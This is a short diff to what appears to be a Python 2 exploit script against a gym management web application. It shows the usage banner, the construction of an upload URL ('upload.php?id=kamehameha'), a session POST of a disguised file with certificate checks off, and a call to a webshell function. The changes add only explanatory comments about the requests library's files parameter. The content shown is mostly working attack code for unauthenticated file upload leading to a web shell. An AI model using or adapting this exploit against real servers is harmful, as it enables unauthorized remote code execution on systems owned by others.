@@ -94,7 +94,7 @@ if __name__ == "__main__":
         print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
         print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
         sys.exit(-1)
-    SERVER_URL = sys.argv[1]
+    SERVER_URL = sys.argv[1]  # <WEBAPP_URL>
     UPLOAD_DIR = 'upload.php?id=kamehameha'
     UPLOAD_URL = SERVER_URL + UPLOAD_DIR
     s = requests.Session()
@@ -110,5 +110,10 @@ if __name__ == "__main__":
             )
     }
     fdata = {'pupload': 'upload'}
+    # requests.request(method, url, **kwargs)
+
+    # files parameter could be a a 4-tuple ('filename', fileobj, 'content_type', custom_headers), where 'content-type'
+    # is a string defining the content type of the given file and custom_headers a dict-like object containing
+    # additional headers to add for the file.
     r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
     webshell(SERVER_URL, s)
